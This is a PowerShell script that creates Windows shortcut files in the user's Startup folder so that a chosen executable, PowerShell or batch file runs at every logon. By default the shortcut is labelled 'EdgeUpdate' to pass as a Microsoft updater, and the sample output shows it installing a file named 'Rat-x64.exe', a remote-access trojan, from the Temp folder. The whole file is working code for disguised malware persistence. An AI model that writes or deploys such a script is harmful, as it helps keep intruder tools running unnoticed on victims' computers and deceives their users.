<#
.SYNOPSIS
   Create a shortcut file that accepts cmdline args.

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19042) x64 bits
   Required Dependencies: none
   Optional Dependencies: none
   PS cmdlet Dev version: v1.0.1

.DESCRIPTION
   Creates an shortcut file that accepts cmdline arguments to execute.

.Parameter target
   The absolucte path of appl\script to execute (default: notepad.exe)

.Parameter Arguments
   The appl\script arguments to be executed (default: false)

.Parameter shortcut
   The absolucte path where to create sortcut.lnk (default: Startup)

.Parameter description
   The shortcut description field (default: EdgeUpdate)

.Parameter wdirectory
   This cmdlet working directory (default: $Env:TMP)

.EXAMPLE
   PS> .\Out-Shortcut.ps1 -shortcut "$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" -target "$Env:TMP\SH.exe" -description "EdgeUpdate"
   create shortcut of '$Env:TMP\SH.exe' PE on startup folder with 'EdgeUpdate' shortcut description
   
.EXAMPLE
   PS> .\Out-Shortcut.ps1 -shortcut "$pwd" -target "$Env:TMP\auxiliary.ps1" -Arguments "-action 'query'"
   create shortcut of '$Env:TMP\auxiliary.ps1' (with arguments) on current folder   

.OUTPUTS
   * Created new shortcut : 'C:\Users\pedro\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Rat-x64.lnk'
     => Target application: 'C:\Users\pedro\AppData\Local\Temp\Rat-x64.exe'

.LINK
	https://github.com/fleschutz/PowerShell
#>


#CmdLet Global variable declarations!
 [CmdletBinding(PositionalBinding=$false)] param(
   [string]$shortcut="$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup",
   [string]$target="$Env:WINDIR\System32\notepad.exe",
   [string]$description="EdgeUpdate",
   [string]$Wdirectory="$Env:TMP",
   [string]$Arguments="False"
)


Write-Host ""
#Check cmdlet mandatory dependencies
$ErrorActionPreference = "SilentlyContinue"
If($target -iNotMatch '(.exe|.ps1|.bat)$')
{
   write-host "x " -ForegroundColor Red -NoNewline
   write-host " Error: -target only accepts '" -ForegroundColor DarkGray -NoNewline
   write-host "exe,ps1,bat" -ForegroundColor Red -NoNewline
   write-host "' extensions." -ForegroundColor DarkGray
   return
}
If(-not(Test-Path -Path "$target"))
{
   write-host "x " -ForegroundColor Red -NoNewline
   write-host " Notfound: '" -ForegroundColor DarkGray -NoNewline
   write-host "$target" -ForegroundColor Red -NoNewline
   write-host "'`n" -ForegroundColor DarkGray
   return
}
If(-not($Wdirectory))
{
   write-host "+ " -ForegroundColor Darkellow -NoNewline
   write-host " Notfound: '" -ForegroundColor DarkGray -NoNewline
   write-host "$Wdirectory" -ForegroundColor Red -NoNewline
   write-host "'`n" -ForegroundColor DarkGray
   New-Item -Name "$Wdirectory" -ItemType folder -Force|Out-Null
}


#Split path to extract last string
$RawTargetName = $target.Split('\')[-1] -replace '(.exe|.ps1|.bat)$','' # notepad
$FinalName = "$shortcut"+"\$RawTargetName.lnk" -Join '' # C:\Users\pedro\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\notepad.lnk

If(Test-Path -Path "$FinalName")
{
   write-host "x " -ForegroundColor Red -NoNewline
   write-host " Duplicate entry detected: '" -ForegroundColor DarkGray -NoNewline
   write-host "$FinalName" -ForegroundColor Red -NoNewline
   write-host "'`n" -ForegroundColor DarkGray
   return
}

try{

   $WScriptShell = New-Object -ComObject WScript.Shell
   $Sh = $WScriptShell.CreateShortcut("$FinalName")
   If($target -iMatch '(.ps1)$')
   {
      If($Arguments -ieq "False")
      {
         $Sh.TargetPath = "$PSHOME\Powershell.exe"
         $Sh.Arguments = "-File $target" ## <-- shortcut cmdline arguments!
      }
      Else
      {
         $Sh.TargetPath = "$PSHOME\Powershell.exe"
         $Sh.Arguments = "-File $target $Arguments" ## <-- shortcut cmdline arguments!      
      }
   }
   ElseIf($target -iMatch '(.bat)$')
   {
      If($Arguments -ieq "False")
      {
         $Sh.TargetPath = "cmd.exe"
         $Sh.Arguments = "/c start $target" ## <-- shortcut cmdline arguments!
      }
      Else
      {
         $Sh.TargetPath = "cmd.exe"
         $Sh.Arguments = "/c start $target $Arguments" ## <-- shortcut cmdline arguments!      
      }
   }
   Else
   {
      If($Arguments -ieq "False")
      {
         $Sh.TargetPath = "$target"
      }
      Else
      {
         $Sh.TargetPath = "$target"
         $Sh.Arguments = "$Arguments" ## <-- shortcut cmdline arguments!      
      }
   }
   
   $Sh.WindowStyle = "1"
   $Sh.WorkingDirectory = "$Wdirectory"
   $Sh.Description = "$description"
   $Sh.Save()

   Write-Host "`n* Created new shortcut : '$FinalName'" -ForegroundColor Green
   Write-Host "  => Target application: '$target'" -ForegroundColor Blue
}catch{
   #Error creating shortcut!
   Write-Error "`nError in line $($_.InvocationInfo.ScriptLineNumber): $($Error[0])"
}
Write-Host ""
